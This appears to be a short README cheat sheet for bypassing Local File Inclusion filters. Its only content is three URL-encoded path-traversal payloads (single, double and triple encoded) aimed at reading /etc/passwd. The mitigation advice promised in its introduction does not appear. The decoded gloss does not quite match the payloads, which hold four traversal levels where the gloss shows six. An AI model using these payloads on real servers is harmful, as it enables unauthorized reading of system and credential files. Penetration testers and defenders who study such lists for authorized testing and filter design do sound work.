<h1 align="center">Local File Inclusion (LFI) Bypass Cheat Sheet</h1>

<p align="center">
  Comprehensive reference guide for Local File Inclusion Bypass identification, exploitation techniques, attack vectors, and mitigation strategies.
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Kali_Linux-111827?style=for-the-badge&logo=kalilinux&logoColor=00BFFF">
  <img src="https://img.shields.io/badge/Web_Security-111827?style=for-the-badge&logo=owasp&logoColor=00A4EF">
  <img src="https://img.shields.io/badge/OffSec-Techniques-111827?style=for-the-badge&logoColor=FF003C">
  <img src="https://img.shields.io/badge/LFI-Local_File_Inclusion-111827?style=for-the-badge&logoColor=00FFFF">
  <img src="https://img.shields.io/badge/Type-CheatSheet-111827?style=for-the-badge&logoColor=00FFFF">
</p>


## Encoding

```
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```
> ../../../../../../etc/passwd

```
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
```
> Doble encoding ../../../../../../etc/passwd

```
%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252fetc%252fpasswd
```
> Triple encoding
